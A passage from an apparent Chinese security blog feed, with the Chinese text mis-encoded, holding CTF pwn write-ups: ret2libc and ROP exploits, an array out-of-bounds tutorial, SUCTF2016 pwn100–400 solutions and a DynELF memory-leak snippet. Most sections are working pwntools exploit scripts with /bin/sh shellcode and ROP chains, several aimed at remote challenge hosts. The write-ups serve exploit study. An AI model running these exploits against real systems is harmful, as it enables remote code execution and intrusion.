<p>æˆ‘ä»¬å‘ç°é™¤äº†ç¨‹åºæœ¬èº«çš„å®ç°çš„å‡½æ•°ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨read@plt()å’Œwrite@plt()å‡½æ•°ã€‚ä½†å› ä¸ºç¨‹åºæœ¬èº«å¹¶æ²¡æœ‰è°ƒç”¨system()å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥è°ƒç”¨system()æ¥è·å–shellã€‚ä½†å…¶å®æˆ‘ä»¬æœ‰write@plt()å‡½æ•°å°±å¤Ÿäº†ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡write@plt ()å‡½æ•°æŠŠwrite()å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ä¹Ÿå°±æ˜¯write.gotç»™æ‰“å°å‡ºæ¥ã€‚æ—¢ç„¶write()å‡½æ•°å®ç°æ˜¯åœ¨libc.soå½“ä¸­ï¼Œé‚£æˆ‘ä»¬è°ƒç”¨çš„write@plt()å‡½æ•°ä¸ºä»€ä¹ˆä¹Ÿèƒ½å®ç°write()åŠŸèƒ½å‘¢? è¿™æ˜¯å› ä¸ºlinuxé‡‡ç”¨äº†å»¶æ—¶ç»‘å®šæŠ€æœ¯ï¼Œå½“æˆ‘ä»¬è°ƒç”¨write@plit()çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°†çœŸæ­£çš„write()å‡½æ•°åœ°å€linkåˆ°gotè¡¨çš„write.gotä¸­ï¼Œç„¶åwrite@plit()ä¼šæ ¹æ®write.got è·³è½¬åˆ°çœŸæ­£çš„write()å‡½æ•°ä¸Šå»ã€‚</p>
<p>å› ä¸ºsystem()å‡½æ•°å’Œwrite()åœ¨libc.soä¸­çš„offset(ç›¸å¯¹åœ°å€)æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¾—åˆ°äº†write()çš„åœ°å€å¹¶ä¸”æ‹¥æœ‰ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„libc.soå°±å¯ä»¥è®¡ç®—å‡ºsystem()åœ¨å†…å­˜ä¸­çš„åœ°å€äº†ã€‚ç„¶åæˆ‘ä»¬å†å°†pcæŒ‡é’ˆreturnå›vulnerable_function()å‡½æ•°ï¼Œå°±å¯ä»¥è¿›è¡Œret2libcæº¢å‡ºæ”»å‡»ï¼Œå¹¶ä¸”è¿™ä¸€æ¬¡æˆ‘ä»¬çŸ¥é“äº†system()åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå°±å¯ä»¥è°ƒç”¨system()å‡½æ•°æ¥è·å–æˆ‘ä»¬çš„shelläº†ã€‚</p>
<p>ä½¿ç”¨lddå‘½ä»¤å¯ä»¥æŸ¥çœ‹ç›®æ ‡ç¨‹åºè°ƒç”¨çš„soåº“ã€‚éšåæˆ‘ä»¬æŠŠlibc.soæ‹·è´åˆ°å½“å‰ç›®å½•ï¼Œå› ä¸ºæˆ‘ä»¬çš„expéœ€è¦è¿™ä¸ªsoæ–‡ä»¶æ¥è®¡ç®—ç›¸å¯¹åœ°å€ï¼š</p>
<p><img src="http://i1.piimg.com/567571/e6d4d1d7b8b7e1ed.png" alt=""></p>
<p>æœ€åçš„expï¼š</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

libc = ELF(&apos;libc.so&apos;)
elf = ELF(&apos;test3&apos;)

p = process(&apos;./test3&apos;)
#p = remote(&apos;127.0.0.1&apos;, 10003)

plt_write = elf.symbols[&apos;write&apos;]
print &apos;plt_write= &apos; + hex(plt_write)
got_write = elf.got[&apos;write&apos;]
print &apos;got_write= &apos; + hex(got_write)
vulfun_addr = 0x0804844d
print &apos;vulfun= &apos; + hex(vulfun_addr)

payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

print &quot;\n###sending payload1 ...###&quot;
p.send(payload1)

print &quot;\n###receving write() addr...###&quot;
write_addr = u32(p.recv(4))
print &apos;write_addr=&apos; + hex(write_addr)

print &quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;
system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])
print &apos;system_addr= &apos; + hex(system_addr)
binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
print &apos;binsh_addr= &apos; + hex(binsh_addr)

payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print &quot;\n###sending payload2 ...###&quot;
p.send(payload2)

p.interactive()
</code></pre><p><img src="http://i1.piimg.com/567571/4b23913d36d0894b.png" alt=""></p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†x86â€”â€”ROPæ”»å‡»çš„åŸºæœ¬åŸç†,å¸Œæœ›èƒ½å¸®åˆ°å¤§å®¶</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnä¹‹-æ•°ç»„ä¸‹æ ‡è¶Šç•Œ</title>
    <url>/2016/08/09/pwn%E4%B9%8B-%E6%95%B0%E7%BB%84%E4%B8%8B%E6%A0%87%E8%B6%8A%E7%95%8C/</url>
    <content><![CDATA[<p><strong>ä¸‹æ ‡è¶Šç•Œ</strong></p>
<p>åœ¨å¼•ç”¨æ•°ç»„å…ƒç´ æ—¶ï¼Œä½¿ç”¨çš„ä¸‹æ ‡è¶…è¿‡äº†è¯¥æ•°ç»„ä¸‹æ ‡çš„åº”æœ‰èŒƒå›´ï¼Œä½†åº”æ³¨æ„çš„æ˜¯:<br><a id="more"></a><br>    C/C++ä¸å¯¹æ•°ç»„åšè¾¹ç•Œæ£€æŸ¥ã€‚ å¯ä»¥é‡å†™æ•°ç»„çš„æ¯ä¸€ç«¯ï¼Œå¹¶å†™å…¥ä¸€äº›å…¶ä»–å˜é‡çš„<br>    æ•°ç»„æˆ–è€…ç”šè‡³æ˜¯å†™å…¥ç¨‹åºçš„ä»£ç ã€‚ä¸æ£€æŸ¥ä¸‹æ ‡æ˜¯å¦è¶Šç•Œå¯ä»¥æœ‰æ•ˆæé«˜ç¨‹åºè¿è¡Œ<br>    çš„æ•ˆç‡ï¼Œå› ä¸ºå¦‚æœä½ æ£€æŸ¥ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å¿…é¡»åœ¨ç”Ÿæˆçš„ç›®æ ‡ä»£ç ä¸­åŠ å…¥é¢å¤–çš„ä»£<br>    ç ç”¨äºç¨‹åºè¿è¡Œæ—¶æ£€æµ‹ä¸‹æ ‡æ˜¯å¦è¶Šç•Œï¼Œè¿™å°±ä¼šå¯¼è‡´ç¨‹åºçš„è¿è¡Œé€Ÿåº¦ä¸‹é™ï¼Œæ‰€ä»¥<br>    ä¸ºäº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ï¼ŒC / C++æ‰ä¸æ£€æŸ¥ä¸‹æ ‡æ˜¯å¦è¶Šç•Œã€‚å‘ç°å¦‚æœæ•°ç»„ä¸‹æ ‡è¶Š<br>    ç•Œäº†ï¼Œé‚£ä¹ˆå®ƒä¼šè‡ªåŠ¨æ¥ç€é‚£å—å†…å­˜å¾€åå†™ã€‚ </p>
<p>å…³äºC/C++ä¸ºä»€ä¹ˆä¸å¯¹æ•°ç»„çš„ä¸‹æ ‡æ˜¯å¦è¶Šç•Œåšæ£€æŸ¥ï¼Œå¯ä»¥å‚è€ƒï¼š<br>This is an <a href="http://www.xuebuyuan.com/967089.html" target="_blank" rel="external">http://www.xuebuyuan.com/967089.html</a></p>
<p>å› ä¸ºç¼–è¯‘å™¨ä¸ä¼šè‡ªåŠ¨æ£€æµ‹ä½ çš„æ•°ç»„ä¸‹æ ‡æ˜¯å¦è¶Šç•Œï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªä»»åŠ¡äº¤ç»™äº†ç¨‹åºå‘˜è‡ªå·±ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å†™ç¨‹åºï¼Œå¼•ç”¨æ•°ç»„å…ƒç´ æ—¶ï¼Œä¸€å®šæ³¨æ„ä¸è¦è®©æ•°ç»„çš„ä¸‹æ ‡è¶Šç•Œã€‚</p>
<p>è¿˜æœ‰ï¼Œåˆå­¦è€…ä¸€å®šä¸èƒ½å¿˜äº†æ•°ç»„çš„ä¸‹æ ‡æ˜¯ä»0å¼€å§‹çš„ï¼Œä¸æ˜¯å¸¸è¯†ä¸­çš„ä»1å¼€å§‹ã€‚</p>
<p>ä¾‹ä¸€</p>
<pre><code>1    void test1()
2    {
3        char string[10];
4        char* str1 = &quot;0123456789&quot;;
5        strcpy(string, str1);
6    }
</code></pre><p>ä¾‹äºŒ</p>
<pre><code>1    void test2()
2    {
3        char string[10], str1[10];
4        int i;
5        for(i=0; i&lt;10; i++)
6        {
7            str1[i] = &apos;a&apos;;
8        }
9        strcpy(string, str1);
10   }
</code></pre><p>ä¾‹ä¸‰</p>
<pre><code>1    void test3(char* str1)
2    {
3        char string[10];
4        if(strlen(str1) &lt;= 10)
5        {
6            strcpy(string, str1); 
7        }
8    }
</code></pre><p>è¿™3ä¸ªä¾‹å­éƒ½æœ‰æ•°ç»„è¶Šç•Œçš„é—®é¢˜ã€‚</p>
<p>ä¾‹ä¸€ä¸­ï¼Œstringæ˜¯ä¸€ä¸ªå«æœ‰10ä¸ªå…ƒç´ çš„å­—ç¬¦æ•°ç»„ï¼Œstr1æŒ‡å‘çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º10ï¼Œåœ¨è¿›è¡Œstrcpyè°ƒç”¨æ—¶ï¼Œä¼šå°†str1çš„ç»“æŸç¬¦ä¹Ÿå¤åˆ¶åˆ°stringæ•°ç»„é‡Œï¼Œå³å¤åˆ¶çš„å­—ç¬¦ä¸ªæ•°ä¸º11ï¼Œè¿™æ ·ä¼šå¯¼è‡´stringå‡ºç°æ•°ç»„è¶Šç•Œã€‚ç¨‹åºä¸ä¸€å®šä¼šå› æ­¤è€Œå´©æºƒï¼Œä½†è¿™æ˜¯ä¸€ä¸ªæ½œåœ¨çš„å±é™©ã€‚è§£å†³åŠæ³•æ˜¯å°†stringçš„å…ƒç´ ä¸ªæ•°å®šä¹‰ä¸º11ã€‚</p>
<p>ä¾‹äºŒä¸­ï¼Œstr1å’Œstringéƒ½æ˜¯å«æœ‰10ä¸ªå…ƒç´ çš„å­—ç¬¦æ•°ç»„ï¼Œå¹¶ä¸”str1çš„å…ƒç´ å…¨éƒ¨è¢«èµ‹ä¸ºå­—ç¬¦â€aâ€ï¼Œç„¶åå†è°ƒç”¨strcpyã€‚è¿™é‡Œä¼šå‡ºç°ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼šä¸€ä¸ªé—®é¢˜æ˜¯str1è¡¨ç¤ºçš„å­—ç¬¦æ•°ç»„æ²¡æœ‰ä»¥â€™\0â€™ç»“æŸï¼Œåœ¨éšåè°ƒç”¨strcpyæ—¶æ— æ³•åˆ¤æ–­ä»€ä¹ˆæ—¶å€™å¤åˆ¶ç»“æŸï¼›å¦ä¸€ä¸ªé—®é¢˜æ˜¯stringçš„æ•°ç»„é•¿åº¦ä¸å¤Ÿï¼Œå‡ºç°æ•°ç»„è¶Šç•Œçš„ç°è±¡ã€‚è§£å†³åŠæ³•æ˜¯å°†stringå’Œstr1çš„å…ƒç´ ä¸ªæ•°éƒ½å®šä¹‰ä¸º11ä¸ªï¼Œå¹¶åœ¨è°ƒç”¨strcpyä¹‹å‰åŠ å…¥ä¸€æ¡è¯­å¥æŠŠstr1[10]èµ‹ä¸ºâ€™\0â€™ã€‚</p>
<p>ä¾‹ä¸‰ä¸­ï¼Œifè¯­å¥ä½¿ç”¨å°äºç­‰äºâ€&lt;=â€è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœstr1çš„é•¿åº¦ç­‰äº10ï¼Œä¹Ÿä¼šå‡ºç°æ•°ç»„è¶Šç•Œçš„æƒ…å†µã€‚è§£å†³åŠæ³•æ˜¯æŠŠâ€&lt;=â€æ¢æˆâ€&lt;â€ã€‚</p>
<p>æ”¹æ­£åçš„ç¨‹åºå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p>ä¾‹ä¸€</p>
<pre><code>1    void test1()
2    {
3        char string[11];           //å­—ç¬¦æ•°ç»„é•¿åº¦ä¸º11ï¼Œå¤šåˆ†é…ä¸€ä¸ª
4        char* str1 = &quot;0123456789&quot;;
5        strcpy(string, str1);
6    }
</code></pre><p>ä¾‹äºŒ</p>
<pre><code>1    void test2()
2    {
3        char string[11], str1[11];   //å­—ç¬¦æ•°ç»„é•¿åº¦éƒ½ä¸º11ï¼Œå‡å¤šåˆ†é…ä¸€ä¸ª
4        int i;
5        for(i=0; i&lt;10; i++)
6        {
7            str1[i] = &apos;a&apos;;
8        }
9        str1[10] = &apos;\0&apos;;            //åˆå§‹åŒ–str1ä¸ºç©ºå­—ç¬¦ä¸²
10       strcpy(string, str1);
11   }
</code></pre><p>ä¾‹ä¸‰</p>
<pre><code>1    void test3(char*str1)
2    {
3        char string[10];
4        if(strlen(str1) &lt; 10)        //ä¸èƒ½ç”¨&lt;=
5        {
6            strcpy(string, str1); 
7        }
8    }
</code></pre><h2 id="iæ˜¥ç§‹30å¼ºæŒ‘æˆ˜èµ›pwn1-writeup"><a href="#iæ˜¥ç§‹30å¼ºæŒ‘æˆ˜èµ›pwn1-writeup" class="headerlink" title="iæ˜¥ç§‹30å¼ºæŒ‘æˆ˜èµ›pwn1 writeup"></a>iæ˜¥ç§‹30å¼ºæŒ‘æˆ˜èµ›pwn1 writeup</h2><p>åœ¨è¾“å…¥æ“ä½œä¸‹æ ‡æ—¶æ²¡æœ‰æ£€æµ‹æ˜¯å¦è¶Šç•Œï¼Œé€šè¿‡æ•°ç»„è¶Šç•Œè¯»è·å–è·å–ä¼ªé€ çš„å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ shellcodeã€‚</p>
<p><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-1.png" alt=""><br><img src="http://sh3ll.me/images/2016/07/04/ichunqiu-2.png" alt=""></p>
<p>é€šè¿‡GDBè°ƒè¯•ï¼Œå‘ç°å‘é€29æ§åˆ¶eipï¼Œnxï¼šdisabledï¼Œå¸ƒç½®å¥½shellcodeåç›´æ¥getshellã€‚</p>
<p><img src="http://p1.bqimg.com/567571/d6a4b67df29cab11.png" alt=""></p>
<p><img src="http://p1.bqimg.com/567571/497e098424fb5aee.png" alt=""></p>
<p><strong>åˆ©ç”¨ä»£ç </strong></p>
<pre><code>from pwn import *
# io = process(&quot;./tc1&quot;)
io = remote(&quot;106.75.9.11&quot;, 20000)
io.recvuntil(&quot;4. Divide&quot;)
io.sendline(&quot;29&quot;)
io.recvuntil(&quot;[123 110]&quot;)
payload = p32(0x804a0a4) + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;
io.sendline(payload)
io.interactive()
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnä¹‹ç¬¬äºŒæ›´SUCTF2016</title>
    <url>/2016/11/29/pwn%E4%B9%8B%E7%AC%AC%E4%BA%8C%E6%9B%B4SUCTF2016/</url>
    <content><![CDATA[<p><a href="http://pan.baidu.com/s/1ge73Bn9" target="_blank" rel="external">é¢˜ç›®é“¾æ¥</a><br><a id="more"></a></p>
<h2 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h2><p>ä»æ¥æ²¡è§è¿‡è¿™æ ·çš„pwnï¼ŒIDAåˆ†æä¸€ä¸‹ç›´æ¥å°±çœ‹åˆ°äº†flagï¼Œè¿™æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿ</p>
<p>ä½†æ˜¯æœ¬ç€åˆå­¦è€…çš„å¿ƒæ€ï¼Œè¿˜æ˜¯ä¹–ä¹–çš„å†™äº†expï¼Œè¿™ä¸ªé¢˜åªè¦è¦†ç›–åœ°å€åˆ°å…³é”®å‡½æ•°ï¼Œè¾“å…¥zhimakaimenå°±å¯ä»¥çœ‹åˆ°flagã€‚</p>
<p>æœ¬åœ°è°ƒè¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *


io=process(&apos;./pwn100&apos;)
get_flag=0x0804865D
password=&apos;zhimakaimen&apos;
def exp():


    payload=&apos;A&apos;*111+chr(0)+p32(get_flag)
    io.sendline(payload)
    io.sendline(password)
    io.interactive()


if __name__==&apos;__main__&apos;:
    exp()
</code></pre><h2 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h2><p>è¿™ä¸ªé¢˜ç›®åº”è¯¥æ˜¯x86ä¸‹çš„ropçš„è€ƒæŸ¥ï¼ŒIDAå¯ä»¥çœ‹åˆ°æœ‰system()å‡½æ•°ï¼Œå¯ä»¥å°†â€˜/bin/shâ€™å†™å…¥åˆ°bssæ®µé‡Œè·å¾—shell</p>
<p>æœ¬åœ°è°ƒè¯•çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *

io=process(&apos;./pwn200&apos;)

systemplt=0x080483c0
readplt=0x080483a0
bssadd=0x0804a040
pppr=0x080485fd

def exp():


    payload=&apos;A&apos;*112+p32(readplt)+p32(pppr)+p32(0)+p32(bssadd)+p32(8)+p32(systemplt)+p32(0xdeadbeef)+p32(bssadd)
    ##payload+=&apos;C&apos;*(256-len(payload))
    io.sendline(payload)
    io.send(&quot;/bin/sh\0&quot;)
    io.interactive()


if __name__==&apos;__main__&apos;:
    exp()
</code></pre><h2 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h2><p>è¿™ä¸ªé¢˜ç›®ä¸€åˆ°æ‰‹åˆ†æä¹‹åå°±æƒ³åˆ©ç”¨DynElfå»æ³„æ¼systemåœ°å€ï¼Œç„¶åå°†/bin/shå†™å…¥bssæ®µæshellï¼Œä½†æ˜¯è„šæœ¬æœ€åä¸èƒ½è¿è¡Œï¼Œä¹‹åå‘ç°ç¨‹åºå±…ç„¶æ˜¯é™æ€ç¼–è¯‘æˆçš„ï¼ï¼ï¼</p>
<p>ä¹‹åå­¦ä¹ äº†åˆ©ç”¨mmapå‡½æ•°æ˜ å°„å†…å­˜ç©ºé—´å°†shellcodeå†™å…¥åˆ°é‡Œé¢ï¼Œç„¶åå°±å¯ä»¥æshellï¼Œå…·ä½“è„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code>from pwn import *

#r = remote(&quot;106.75.84.74&quot;, 10001)#pwn
r = remote(&quot;118.193.194.73&quot;,10002)#pwn
#r = process(&quot;./pwn300&quot;)

mmap = 0x08052420
main = 0x08048254
read = 0x080518A0

r.recvuntil(&quot;payload:&quot;)
payload = &quot;a&quot;*0x70
payload += p32(mmap)
payload += p32(main)
payload += p32(0xb6ffd000)
payload += p32(0x100)
payload += p32(0x7)
payload += p32(0x22)
payload += p32(0xffffffff)
payload += p32(0)
r.sendline(payload)

r.recvuntil(&quot;payload:&quot;)
payload = &quot;a&quot;*0x68
payload += p32(read)
payload += p32(0xb6ffd000)
payload += p32(0)
payload += p32(0xb6ffd000)
payload += p32(0x40)
r.sendline(payload)

payload = &quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&quot;

r.sendline(payload)
r.interactive()
</code></pre><p>é‡Œé¢æ¶‰åŠåˆ°mmapçš„å‡ ä¸ªå‚æ•°, ä¸»è¦æ˜¯protå’Œflags,<br>å…¶å€¼çš„å®šä¹‰åœ¨ glibc/bits/mman-linux.h æ–‡ä»¶ä¸­:</p>
<pre><code>#define PROT_READ        0x1                /* Page can be read.  */
#define PROT_WRITE       0x2                /* Page can be written.  */
#define PROT_EXEC        0x4                /* Page can be executed. */
#define PROT_NONE        0x0                /* Page can not be accessed.  */
</code></pre><p>è¿™ä¸ªprotçš„4ä¸ªå‚æ•°, æ ¹linuxçš„æƒé™è®¾ç½®å·®ä¸å¤š, è¿™é‡Œæˆ‘æŠŠæ˜ å°„çš„åœ°å€è®¾ä¸º rwx , æ‰€ä»¥å…¶å€¼ä¸º7<br>ç„¶åæ˜¯flagsçš„å®šä¹‰:</p>
<pre><code>#define MAP_SHARED        0x01           /* Share changes.  */
#define MAP_PRIVATE       0x02           /* Changes are private.  */
#define MAP_FIXED         0x10           /* Interpret addr exactly.  */
#ifdef __USE_MISC
# define MAP_FILE         0
# ifdef __MAP_ANONYMOUS
#  define MAP_ANONYMOUS   __MAP_ANONYMOUS /* Don&apos;t use a file.  */
# else
#  define MAP_ANONYMOUS   0x20            /* Don&apos;t use a file.  */
# endif
# define MAP_ANON        MAP_ANONYMOUS
</code></pre><p>flagsæˆ‘ä»¬éœ€è¦è®¾ç½® MAP_ANONYMOUS å’Œ MAP_PRIVATE</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯é¢˜ç›®é‡Œé¢è¿˜æœ‰ä¸ªå°å‘ï¼Œ</p>
<p>åœ¨0x08048257ä¸‹ä¸ªæ–­ç‚¹ï¼Œæ­¤æ—¶çš„esp=0xffffcfd8<br>ä¹‹ååœ¨0x0804825aä¸‹æ–­ç‚¹ï¼Œæ­¤æ—¶çš„esp=0xffffcfd0<br>æ‰§è¡Œä¹‹åå¹³ç™½æ— æ•…å°‘äº†8ä¸ªå­—èŠ‚<br>æ‰€ä»¥v5çš„åœ°å€esp+1Cä»64å˜ä¸º6cï¼Œæ‰€ä»¥ç¬¬ä¸€æ®µpayloadæ˜¯70ï¼Œç„¶è€Œæ‰§è¡Œshellcodeçš„æ—¶å€™åœ°å€æœ€ä½ä½å·²ç»æ˜¯0äº†ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªpayloadæ˜¯68</p>
<p>ç”±äºæ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘çš„ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ROPgadgetç›´æ¥å¯»æ‰¾ropé“¾ï¼ŒROPgadget â€“binary pwn300 â€“ropchain</p>
<pre><code>from pwn import *
r = process(&quot;./pwn300&quot;)

from struct import pack

# Padding goes here
p = &apos;&apos;

p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca160) # @ .data
p += pack(&apos;&lt;I&apos;, 0x08097d94) # pop eax ; ret
p += &apos;/bin&apos;
p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca164) # @ .data + 4
p += pack(&apos;&lt;I&apos;, 0x08097d94) # pop eax ; ret
p += &apos;//sh&apos;
p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
p += pack(&apos;&lt;I&apos;, 0x080977cf) # xor eax, eax ; ret
p += pack(&apos;&lt;I&apos;, 0x08079281) # mov dword ptr [edx], eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0805269e) # pop ebx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca160) # @ .data
p += pack(&apos;&lt;I&apos;, 0x0805269d) # pop ecx ; pop ebx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
p += pack(&apos;&lt;I&apos;, 0x080ca160) # padding without overwrite ebx
p += pack(&apos;&lt;I&apos;, 0x08052676) # pop edx ; ret
p += pack(&apos;&lt;I&apos;, 0x080ca168) # @ .data + 8
p += pack(&apos;&lt;I&apos;, 0x080977cf) # xor eax, eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0806a60f) # inc eax ; ret
p += pack(&apos;&lt;I&apos;, 0x0804884d) # int 0x80
print len(p)+0x68

r.sendline(payload)
r.interactive()
</code></pre><h2 id="pwn400"><a href="#pwn400" class="headerlink" title="pwn400"></a>pwn400</h2><p>æœ¬é¢˜ä¸»è¦çš„æ€è·¯å°±æ˜¯åˆ©ç”¨DynELFæ³„æ¼systemåœ°å€ï¼Œç„¶åå°†/bin/shå†™å…¥bssæ®µï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡Gadgetçš„åˆ©ç”¨</p>
<pre><code># -*-coding:utf-8-*-

from pwn import *

r = remote(&quot;23.106.148.10&quot;,20000)#pwn
#r = process(&quot;./simple&quot;)

write_plt = 0x00000000004004B0
read_plt = 0x00000000004004D0
main = 0x0000000004005F6
bss = 0x000000000600a70 + 0x100

pop_rdi_ret = 0x00000000004006c3
pop_rsi_pop_r15_ret = 0x00000000004006c1

def leak(addr):
    r.recvuntil(&quot;luck!\n&quot;)
    payload = &quot;a&quot;*0x28
    payload += p64(pop_rdi_ret)
    payload += p64(0x1)
    payload += p64(pop_rsi_pop_r15_ret)
    payload += p64(addr)
    payload += p64(0x6161616161616161)
    payload += p64(write_plt)
    payload += p64(main)
    r.sendline(payload)
    data = r.recv(8)
    return data

d = DynELF(leak, main, elf=ELF(&apos;./simple&apos;))
system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
print &quot;[*] system addr:{0}&quot;.format(hex(system_addr))

r.recvuntil(&quot;luck!\n&quot;)
payload = &quot;a&quot; * 0x28
payload += p64(pop_rdi_ret)
payload += p64(0x0)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(bss)
payload += p64(0x6161616161616161)
payload += p64(read_plt)
payload += p64(main)
r.sendline(payload)

r.sendline(&quot;/bin/sh&quot;)

r.recvuntil(&quot;luck!\n&quot;)
payload = &quot;a&quot; * 0x28
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(system_addr)
r.sendline(payload)


r.interactive()
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnå­¦ä¹ ä¹‹DynELFçš„ä½¿ç”¨</title>
    <url>/2016/11/19/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8BDynELF%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>æœ¬æ–‡æ˜¯é’ˆå¯¹ä¸€æ­¥ä¸€æ­¥å­¦ropä¹‹x86ç¯‡ä¸­çš„test2çš„ä¸€ç§memory leakï¼ˆå†…å­˜æ³„æ¼ï¼‰çš„æ–¹æ³•ï¼Œæ˜¯é€šè¿‡pwntoolsä¸­DynELFæ¨¡å—æ¥è¿›è¡Œå†…å­˜æœç´¢ã€‚åœ¨ctfæ¯”èµ›ä¸­å¸¸å¸¸ä¼šé‡åˆ°ä¸€ç§ä¸æä¾›libc.soçš„é¢˜ç›®ï¼Œéƒ½å¯ä»¥åˆ©ç”¨è¿™æ ·çš„æ–¹æ³•åœ¨å†…å­˜ä¸­å¯»æ‰¾system()åœ°å€ã€‚<br><a id="more"></a></p>
<h2 id="leakå‡½æ•°"><a href="#leakå‡½æ•°" class="headerlink" title="leakå‡½æ•°"></a>leakå‡½æ•°</h2><pre><code>#!python
def leak(address):
    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
return data
</code></pre><p>éšåå°†è¿™ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°å†è°ƒç”¨d = DynELF(leak, elf=ELF(â€˜./test2â€™))å°±å¯ä»¥å¯¹DynELFæ¨¡å—è¿›è¡Œåˆå§‹åŒ–äº†ã€‚ç„¶åå¯ä»¥é€šè¿‡è°ƒç”¨system_addr = d.lookup(â€˜systemâ€™, â€˜libcâ€™)æ¥å¾—åˆ°libc.soä¸­system()åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚</p>
